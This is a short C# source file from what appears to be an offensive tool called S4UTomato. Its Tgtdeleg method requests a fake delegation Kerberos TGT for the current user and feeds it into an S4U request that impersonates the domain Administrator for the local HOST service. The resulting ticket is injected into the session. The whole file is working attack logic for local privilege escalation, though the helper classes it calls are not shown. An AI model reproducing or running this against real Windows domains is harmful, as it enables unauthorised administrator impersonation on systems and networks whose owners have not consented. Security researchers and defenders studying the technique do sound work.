using System;
using System.Collections.Generic;


namespace S4UTomato.Methods
{
    public class Tgtdeleg
    {
        public static void Execute(string domain, string domainController)
        {
            string targetUser = $"{domain}\\Administrator";
            string targetSPN = "";
            string altService = $"HOST/{Environment.MachineName}";
            string outfile = "";
            bool ptt = true;
            bool self = true;
            string keyString = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            Console.WriteLine("[*] Action: Request Fake Delegation TGT (current user)");
            //if (S4UTomato.Program.Verbose)
                //Console.WriteLine("\r\n");

            byte[] blah = LSA.RequestFakeDelegTicket();
            KRB_CRED kirbi = new KRB_CRED(blah);

            S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, null, null, null, self, false, false, keyString, encType);
        }
    }
}